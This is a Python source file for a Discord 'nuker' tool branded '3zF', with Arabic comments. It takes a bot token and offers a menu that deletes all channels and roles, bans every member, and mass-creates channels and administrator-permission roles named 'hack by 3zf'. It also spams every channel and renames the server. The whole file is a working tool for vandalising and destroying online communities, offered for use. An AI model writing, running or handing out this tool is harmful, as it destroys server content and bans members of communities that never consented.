#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random
import asyncio
import discord
from discord.ext import commands
from colorama import init, Fore, Back, Style

init(autoreset=True)

# البانر الأساسي
BANNER = f"""
{Back.RED}{'='*60}
{Back.RED}{Fore.WHITE}   DISCORD NUKER - 3zF   {Back.RED}
{Back.RED}{Fore.WHITE}  ~ Tools By 3zF ~   {Back.RED}
{Back.RED}{'='*60}

{Fore.RED}██████╗  ██████╗ ███████╗███████╗{Style.RESET_ALL}
{Fore.RED}╚════██╗██╔═████╗██╔════╝██╔════╝{Style.RESET_ALL}
{Fore.RED} █████╔╝██║██╔██║███████╗███████╗{Style.RESET_ALL}
{Fore.RED} ╚═══██╗████╔╝██║╚════██║╚════██║{Style.RESET_ALL}
{Fore.RED}██████╔╝╚██████╔╝███████║███████║{Style.RESET_ALL}
{Fore.RED}╚═════╝  ╚═════╝ ╚══════╝╚══════╝{Style.RESET_ALL}
"""

def clear_screen(): 
    os.system("cls" if os.name == "nt" else "clear")

def show_banner(user=None):
    clear_screen()
    print(BANNER)
    if user: 
        print(f"{Fore.GREEN}[+] Logged as {user}{Style.RESET_ALL}")

# بداية البرنامج
show_banner()
TOKEN = input(f"{Fore.CYAN}> Token: {Style.RESET_ALL}").strip()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

selected_guild = None
running = True

@bot.event
async def on_ready():
    global selected_guild
    show_banner(bot.user)

    servers = list(bot.guilds)
    print(f"{Fore.YELLOW}Servers:{Style.RESET_ALL}")
    for i, g in enumerate(servers):
        print(f"  {Fore.CYAN}{i+1}. {g.name} ({g.id}){Style.RESET_ALL}")

    while True:
        try:
            idx = int(input(f"\n{Fore.CYAN}> Choose server number: {Style.RESET_ALL}")) - 1
            if 0 <= idx < len(servers):
                selected_guild = servers[idx]
                break
        except Exception:
            pass
        print(f"{Fore.RED}[-] Invalid number{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}[+] Selected: {selected_guild.name}{Style.RESET_ALL}")
    await main_menu()

async def main_menu():
    global running
    while running:
        print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Server: {Fore.WHITE}{selected_guild.name}{Style.RESET_ALL}")
        print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
        print(f"  {Fore.RED}1{Fore.WHITE} > {Fore.CYAN}Delete All Channels{Style.RESET_ALL}")
        print(f"  {Fore.RED}2{Fore.WHITE} > {Fore.CYAN}Create Channels{Style.RESET_ALL}")
        print(f"  {Fore.RED}3{Fore.WHITE} > {Fore.CYAN}Ban All Members{Style.RESET_ALL}")
        print(f"  {Fore.RED}4{Fore.WHITE} > {Fore.CYAN}Delete All Roles{Style.RESET_ALL}")
        print(f"  {Fore.RED}5{Fore.WHITE} > {Fore.CYAN}Create Roles{Style.RESET_ALL}")
        print(f"  {Fore.RED}6{Fore.WHITE} > {Fore.CYAN}Spam All Channels{Style.RESET_ALL}")
        print(f"  {Fore.RED}7{Fore.WHITE} > {Fore.CYAN}Change Server Name{Style.RESET_ALL}")
        print(f"  {Fore.RED}8{Fore.WHITE} > {Fore.CYAN}Exit{Style.RESET_ALL}")
        print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

        choice = input(f"\n{Fore.CYAN}> Choose: {Style.RESET_ALL}").strip()

        if choice == "1": await delete_all_channels()
        elif choice == "2": await create_channels()
        elif choice == "3": await ban_all_members()
        elif choice == "4": await delete_all_roles()
        elif choice == "5": await create_roles()
        elif choice == "6": await spam_channels()
        elif choice == "7": await change_server_name()
        elif choice == "8":
            running = False
            print(f"{Fore.GREEN}[+] Exited{Style.RESET_ALL}")
            await bot.close()
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Wrong number{Style.RESET_ALL}")

# العمليات الأساسية
async def delete_all_channels():
    print(f"\n{Fore.YELLOW}[+] Deleting all channels...{Style.RESET_ALL}")
    # استخدام gather مع return_exceptions لمنع توقف البرنامج عند فشل قناة معينة
    await asyncio.gather(*[ch.delete() for ch in selected_guild.channels], return_exceptions=True)
    print(f"{Fore.GREEN}[+] Deleted all channels!{Style.RESET_ALL}")

async def create_channels():
    try:
        num = int(input(f"{Fore.CYAN}> How many channels: {Style.RESET_ALL}"))
    except Exception:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
    
    names = ["hack by 3zf", "nuker by 3zF"]
    tasks = []
    for i in range(num):
        tasks.append(selected_guild.create_text_channel(names[i % len(names)]))
    
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Created {num} channels!{Style.RESET_ALL}")

async def ban_all_members():
    confirm = input(f"{Fore.RED}> Sure you want to ban everyone? (yes/no): {Style.RESET_ALL}")
    if confirm.lower() != "yes":
        print(f"{Fore.RED}[-] Cancelled{Style.RESET_ALL}")
        return
    
    # جلب الأعضاء بشكل صحيح للتأكد من القائمة الكاملة
    try:
        await selected_guild.fetch_members()
        members = [m for m in selected_guild.members if m.id != bot.user.id]
        tasks = [m.ban(reason="Nuked by 3zF") for m in members]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Banned all members!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error banning: {e}{Style.RESET_ALL}")

async def delete_all_roles():
    # حذف كل الأدوار ما عدا @everyone
    roles = [r for r in selected_guild.roles if r.name != "@everyone"]
    await asyncio.gather(*[r.delete() for r in roles], return_exceptions=True)
    print(f"{Fore.GREEN}[+] Deleted all roles!{Style.RESET_ALL}")

async def create_roles():
    try:
        num = int(input(f"{Fore.CYAN}> How many roles: {Style.RESET_ALL}"))
    except Exception:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
    
    names = ["hack by 3zf", "nuker by 3zF"]
    tasks = []
    for i in range(num):
        name = names[i % len(names)]
        color = random.randint(0, 0xFFFFFF)
        tasks.append(selected_guild.create_role(name=name,
                                                color=discord.Color(color),
                                                permissions=discord.Permissions(administrator=True)))
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Created {num} roles!{Style.RESET_ALL}")

async def spam_channels():
    try:
        per = int(input(f"{Fore.CYAN}> How many messages per channel: {Style.RESET_ALL}"))
    except Exception:
        print(f"{Fore.RED}[-] Number only{Style.RESET_ALL}")
        return
        
    msg = input(f"{Fore.CYAN}> Message: {Style.RESET_ALL}")
    
    tasks = []
    for ch in selected_guild.text_channels:
        for _ in range(per):
            tasks.append(ch.send(msg))
            
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{Fore.GREEN}[+] Spam finished!{Style.RESET_ALL}")

async def change_server_name():
    name = input(f"{Fore.CYAN}> New server name: {Style.RESET_ALL}")
    try:
        await selected_guild.edit(name=name)
        print(f"{Fore.GREEN}[+] Server name changed to: {name}{Style.RESET_ALL}")
    except Exception:
        print(f"{Fore.RED}[-] Failed to change name{Style.RESET_ALL}")

# تشغيل البوت
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception:
        print(f"{Fore.RED}[-] Invalid token{Style.RESET_ALL}")
        sys.exit(1)
